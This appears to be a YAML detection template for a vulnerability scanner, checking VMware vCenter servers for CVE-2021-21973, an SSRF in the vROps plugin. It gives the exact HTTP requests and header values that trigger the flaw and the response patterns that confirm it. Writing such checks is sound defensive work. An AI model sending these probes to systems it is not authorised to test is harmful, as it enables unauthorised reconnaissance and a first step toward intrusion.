id: CNNVD-202102-1559
name: CVE-2021-21973
tags:
    - VMware-vCenter
transport: http
set:
    BaseURL: request.url.host
    randstr1: randomLowercase(6)
    randstr2: randomLowercase(6)
    randstr3: randomLowercase(6)
rules:
    req1:
        request:
            cache: true
            follow_redirects: true
            method: GET
            path: /ui/vropspluginui/rest/services/getvcdetails
            headers:
                Vcip: '{{BaseURL}}'
                Vcpassword: '{{randstr1}}'
                Vcusername: '{{randstr2}}'
                Reqresource: '{{randstr3}}'
        expression: response.status==500 && response.body.bcontains(b'The server sent HTTP status code 200')
    req2:
        request:
            cache: true
            follow_redirects: true
            method: GET
            path: /ui/vropspluginui/rest/services/updateova
        expression: ( response.status==200 || response.status==405 ) && response.body.bcontains(b'HTTP Status 405 - Method Not Allowed')
expression: req1() || req2()
detail:
    fingerprint:
        softhard: ""
        product: ""
        company: ""
        category: ""
        parent_category: ""
    vulnerability:
        proof:
            info: 存在CVE-2021-21973漏洞
needreverse: false
